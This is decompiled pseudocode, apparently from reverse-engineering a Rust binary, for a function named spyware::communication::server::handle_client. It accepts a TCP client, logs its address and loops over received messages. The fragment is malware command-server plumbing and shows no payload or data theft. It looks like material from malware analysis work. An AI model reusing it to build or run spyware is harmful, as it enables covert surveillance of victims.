__int64 __fastcall spyware::communication::server::handle_client(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 v5; // rax
  __int64 v6; // rdx
  __int64 v7; // rcx
  __int64 v8; // r8
  __int64 v9; // r9
  __int64 v10; // rdx
  __int64 v11; // rcx
  __int64 v12; // rax
  unsigned int v14; // [rsp+4h] [rbp-F4h] BYREF
  __int64 v15; // [rsp+8h] [rbp-F0h] BYREF
  __int128 v16; // [rsp+10h] [rbp-E8h] BYREF
  __m256i v17; // [rsp+20h] [rbp-D8h]
  __int128 v18; // [rsp+40h] [rbp-B8h]
  __int128 v19; // [rsp+50h] [rbp-A8h] BYREF
  __m256i v20; // [rsp+60h] [rbp-98h]
  __int128 v21; // [rsp+80h] [rbp-78h]
  __int64 *v22; // [rsp+90h] [rbp-68h] BYREF
  __int64 (__fastcall *v23)(); // [rsp+98h] [rbp-60h]
  __int128 v24; // [rsp+A0h] [rbp-58h] BYREF
  __m256i v25; // [rsp+B0h] [rbp-48h]
  __int128 v26; // [rsp+D0h] [rbp-28h]
  __int128 v27; // [rsp+E0h] [rbp-18h]

  v14 = a1;
  if ( (unsigned __int64)core::sync::atomic::atomic_load(a1, a2, a3, a4) >= 4 )
  {
    std::net::tcp::TcpStream::peer_addr(&v16, &v14);
    if ( (_WORD)v16 == 2 )
    {
      v4 = *((_QWORD *)&v16 + 1);
      goto LABEL_9;
    }
    v24 = v16;
    v27 = *(_OWORD *)v17.m256i_i8;
    *(_OWORD *)v25.m256i_i8 = *(_OWORD *)v17.m256i_i8;
    v22 = (__int64 *)&v24;
    v23 = <core::net::socket_addr::SocketAddr as core::fmt::Display>::fmt;
    *(_QWORD *)&v19 = &off_B8C30;
    *((_QWORD *)&v19 + 1) = 1LL;
    v20.m256i_i64[0] = (__int64)&v22;
    *(_OWORD *)&v20.m256i_u64[1] = 1uLL;
    v5 = log::__private_api::loc(&off_B8C70);
    *(_QWORD *)&v16 = aSpywareCommuni;
    *((_QWORD *)&v16 + 1) = 30LL;
    v17.m256i_i64[0] = (__int64)aSpywareCommuni;
    v17.m256i_i64[1] = 30LL;
    v17.m256i_i64[2] = v5;
    log::__private_api::log(&v19, 4LL, &v16);
  }
  while ( 1 )
  {
    spyware::communication::server::get_message((__int64)&v24, (__int64)&v14);
    if ( (_QWORD)v24 == 0x800000000000000ALL )
      break;
    v18 = v26;
    v17 = v25;
    v16 = v24;
    *(_QWORD *)&v19 = &off_B8C50;
    *((_QWORD *)&v19 + 1) = 1LL;
    v20.m256i_i64[0] = 8LL;
    *(_OWORD *)&v20.m256i_u64[1] = 0LL;
    std::io::stdio::_print(&v19);
    v21 = v18;
    v20 = v17;
    v19 = v16;
    spyware::communication::server::handle_message((__int64)&v19, (char **)&v14, v6, v7, v8, v9);
  }
  v4 = *((_QWORD *)&v24 + 1);
  v15 = *((_QWORD *)&v24 + 1);
  *(_QWORD *)&v19 = &off_B8C40;
  *((_QWORD *)&v19 + 1) = 1LL;
  v20.m256i_i64[0] = 8LL;
  *(_OWORD *)&v20.m256i_u64[1] = 0LL;
  std::io::stdio::_print(&v19);
  if ( core::sync::atomic::atomic_load(&v19, &v14, v10, v11) )
  {
    v22 = &v15;
    v23 = <std::io::error::Error as core::fmt::Display>::fmt;
    *(_QWORD *)&v19 = &off_B8C60;
    *((_QWORD *)&v19 + 1) = 1LL;
    v20.m256i_i64[0] = (__int64)&v22;
    *(_OWORD *)&v20.m256i_u64[1] = 1uLL;
    v12 = log::__private_api::loc(&off_B8C88);
    *(_QWORD *)&v16 = aSpywareCommuni;
    *((_QWORD *)&v16 + 1) = 30LL;
    v17.m256i_i64[0] = (__int64)aSpywareCommuni;
    v17.m256i_i64[1] = 30LL;
    v17.m256i_i64[2] = v12;
    log::__private_api::log(&v19, 1LL, &v16);
    v4 = v15;
  }
LABEL_9:
  core::ptr::drop_in_place<std::net::tcp::TcpStream>(v14);
  return v4;
}